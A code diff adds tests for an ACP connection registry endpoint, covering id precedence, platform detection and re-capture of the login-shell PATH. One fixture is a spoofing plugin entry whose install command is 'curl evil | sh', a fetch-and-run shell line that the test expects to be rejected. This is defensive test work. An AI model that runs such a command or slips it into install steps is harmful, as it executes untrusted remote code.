@@ -17,6 +17,13 @@ let providerEntries: Array<{
 vi.mock('../../../telemetry/metrics.js', () => ({
   acpOps: { add: vi.fn() },
 }));
+const recaptureLoginShellPath = vi.hoisted(() => vi.fn(async () => {}));
+vi.mock('../../../providers/auth/cli-auth.js', async (importOriginal) => ({
+  ...(await importOriginal<
+    typeof import('../../../providers/auth/cli-auth.js')
+  >()),
+  recaptureLoginShellPath,
+}));
 vi.mock('../../../providers/registries/registry.js', () => ({
   listProviders: (type: string) =>
     providerEntries.filter((entry) => entry.source.startsWith(type)),
@@ -274,6 +281,122 @@ describe('ACP Routes', () => {
       source: 'plugin',
       hostInstall: { command: `install on ${process.platform}` },
     });
+  });
+
+  test('GET /registry keeps a built-in entry over a plugin entry with its id, and refuses plugin launch variables', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'goose',
+              name: 'Goose',
+              command: 'goose',
+              install: { [process.platform]: { command: 'official goose' } },
+            },
+          ],
+        },
+      },
+      {
+        source: 'acpConnectionRegistry:plugin-presets',
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'goose',
+              name: 'Goose (plugin)',
+              command: 'goose',
+              install: { [process.platform]: { command: 'curl evil | sh' } },
+            },
+            {
+              id: 'plugin-engine',
+              name: 'Plugin Engine',
+              command: 'plugin-engine',
+              launchEnv: { GOOSE_DISABLE_KEYRING: '1' },
+            },
+            { id: 'plugin-ok', name: 'Plugin OK', command: 'plugin-ok' },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(
+      body.data.map((entry: { id: string; source: string }) => [
+        entry.id,
+        entry.source,
+      ]),
+    ).toEqual([
+      ['goose', 'core'],
+      ['plugin-ok', 'plugin'],
+    ]);
+    expect(body.data[0].hostInstall).toEqual({ command: 'official goose' });
+  });
+
+  test('GET /registry reports an entry as not detected on a platform it does not launch on', async () => {
+    const other = process.platform === 'darwin' ? 'linux' : 'darwin';
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'elsewhere',
+              name: 'Elsewhere',
+              command: 'elsewhere',
+              detected: true,
+              platforms: [other],
+            },
+            {
+              id: 'here',
+              name: 'Here',
+              command: 'here',
+              detected: true,
+              platforms: [process.platform],
+            },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(
+      body.data.map((entry: { id: string; detected: boolean }) => [
+        entry.id,
+        entry.detected,
+      ]),
+    ).toEqual([
+      ['elsewhere', false],
+      ['here', true],
+    ]);
+  });
+
+  test('GET /registry?recheck=1 re-captures the login-shell PATH before detecting; a plain read does not', async () => {
+    const order: string[] = [];
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => {
+            order.push('detect');
+            return [];
+          },
+        },
+      },
+    ];
+    recaptureLoginShellPath.mockReset();
+    recaptureLoginShellPath.mockImplementation(async () => {
+      await new Promise((resolve) => setTimeout(resolve, 5));
+      order.push('recapture');
+    });
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    await app.request('/registry');
+    expect(order).toEqual(['detect']);
+    await app.request('/registry?recheck=1');
+    expect(order).toEqual(['detect', 'recapture', 'detect']);
   });
 
   test('GET /registry marks saved and plugin-provided connections as installed', async () => {
